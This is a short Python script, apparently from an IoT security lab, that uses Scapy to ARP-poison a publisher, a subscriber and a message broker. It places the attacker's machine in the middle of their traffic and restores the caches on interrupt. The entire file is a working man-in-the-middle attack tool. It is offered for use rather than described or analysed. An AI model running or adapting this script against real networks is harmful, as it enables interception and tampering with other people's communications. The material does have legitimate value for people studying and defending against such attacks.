import time

from scapy.all import ARP, Ether, sendp, srp

from common.config import (
    ATTACKER_INTERFACE,
    BROKER_IP,
    PUBLISHER_IP,
    SUBSCRIBER_IP,
)


def get_mac(ip):
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        iface=ATTACKER_INTERFACE,
        verbose=False,
    )
    for s, r in ans:
        return r[Ether].src
    return None


def poison(target_ip, target_mac, spoof_ip):
    """Tell target_ip that spoof_ip is at our MAC address."""
    sendp(
        Ether(dst=target_mac)
        / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip),
        iface=ATTACKER_INTERFACE,
        verbose=False,
    )


def restore(target_ip, target_mac, real_ip, real_mac):
    """Restore the real MAC for real_ip on target_ip."""
    sendp(
        Ether(dst=target_mac)
        / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac),
        count=5,
        iface=ATTACKER_INTERFACE,
        verbose=False,
    )


broker_mac = get_mac(BROKER_IP)
pub_mac = get_mac(PUBLISHER_IP)
sub_mac = get_mac(SUBSCRIBER_IP)

print(f"broker={broker_mac}, pub={pub_mac}, sub={sub_mac}")

if not all([broker_mac, pub_mac, sub_mac]):
    raise SystemExit(
        "Could not resolve one or more MAC addresses. Check the network/interface."
    )

try:
    while True:
        # Tell publisher: "I am the broker"
        poison(PUBLISHER_IP, pub_mac, BROKER_IP)
        # Tell subscriber: "I am the broker"
        poison(SUBSCRIBER_IP, sub_mac, BROKER_IP)
        # Tell broker: "I am the publisher"
        poison(BROKER_IP, broker_mac, PUBLISHER_IP)
        time.sleep(2)
except KeyboardInterrupt:
    print("restoring...")
    restore(PUBLISHER_IP, pub_mac, BROKER_IP, broker_mac)
    restore(SUBSCRIBER_IP, sub_mac, BROKER_IP, broker_mac)
    restore(BROKER_IP, broker_mac, PUBLISHER_IP, pub_mac)
